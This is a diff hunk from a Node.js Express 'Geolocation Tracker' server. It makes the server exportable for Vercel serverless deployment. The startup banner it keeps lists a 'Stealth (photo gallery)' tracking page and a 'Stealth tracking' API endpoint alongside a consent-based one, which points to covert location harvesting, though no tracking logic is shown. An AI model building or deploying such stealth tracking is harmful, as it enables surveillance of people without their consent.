@@ -390,28 +390,33 @@ app.use((req, res) => {
   res.status(404).json({ error: 'Route not found' });
 });
 
-// Start server
-app.listen(PORT, () => {
-  console.log(`\n${'='.repeat(60)}`);
-  console.log(`🚀 Geolocation Tracker Server ONLINE`);
-  console.log(`${'='.repeat(60)}`);
-  console.log(`\n📍 TRACKING PAGES:`);
-  console.log(`   Standard (with consent): http://localhost:${PORT}/`);
-  console.log(`   Stealth (photo gallery): http://localhost:${PORT}/track`);
-  console.log(`\n🔐 ADMIN DASHBOARD:`);
-  console.log(`   Dashboard URL: http://localhost:${PORT}/admin`);
-  console.log(`   Username: ${ADMIN_USERNAME}`);
-  console.log(`   Password: ${ADMIN_PASSWORD}`);
-  console.log(`   ⚠️  CHANGE THESE CREDENTIALS IN PRODUCTION!`);
-  console.log(`\n📊 API ENDPOINTS:`);
-  console.log(`   POST /api/track         - Stealth tracking`);
-  console.log(`   POST /log-location      - Standard tracking`);
-  console.log(`   GET  /api/admin/tracks  - View all tracks`);
-  console.log(`   GET  /api/admin/export  - Export data`);
-  console.log(`\n⚖️  LEGAL NOTICE:`);
-  console.log(`   This is for educational/testing purposes only.`);
-  console.log(`   Always obtain explicit consent before tracking.`);
-  console.log(`   Unauthorized tracking is illegal and unethical.`);
-  console.log(`\n${'='.repeat(60)}\n`);
-});
+// Start server (only when not in serverless environment)
+if (require.main === module) {
+  app.listen(PORT, () => {
+    console.log(`\n${'='.repeat(60)}`);
+    console.log(`🚀 Geolocation Tracker Server ONLINE`);
+    console.log(`${'='.repeat(60)}`);
+    console.log(`\n📍 TRACKING PAGES:`);
+    console.log(`   Standard (with consent): http://localhost:${PORT}/`);
+    console.log(`   Stealth (photo gallery): http://localhost:${PORT}/track`);
+    console.log(`\n🔐 ADMIN DASHBOARD:`);
+    console.log(`   Dashboard URL: http://localhost:${PORT}/admin`);
+    console.log(`   Username: ${ADMIN_USERNAME}`);
+    console.log(`   Password: ${ADMIN_PASSWORD}`);
+    console.log(`   ⚠️  CHANGE THESE CREDENTIALS IN PRODUCTION!`);
+    console.log(`\n📊 API ENDPOINTS:`);
+    console.log(`   POST /api/track         - Stealth tracking`);
+    console.log(`   POST /log-location      - Standard tracking`);
+    console.log(`   GET  /api/admin/tracks  - View all tracks`);
+    console.log(`   GET  /api/admin/export  - Export data`);
+    console.log(`\n⚖️  LEGAL NOTICE:`);
+    console.log(`   This is for educational/testing purposes only.`);
+    console.log(`   Always obtain explicit consent before tracking.`);
+    console.log(`   Unauthorized tracking is illegal and unethical.`);
+    console.log(`\n${'='.repeat(60)}\n`);
+  });
+}
+
+// Export for Vercel serverless functions
+module.exports = app;
 
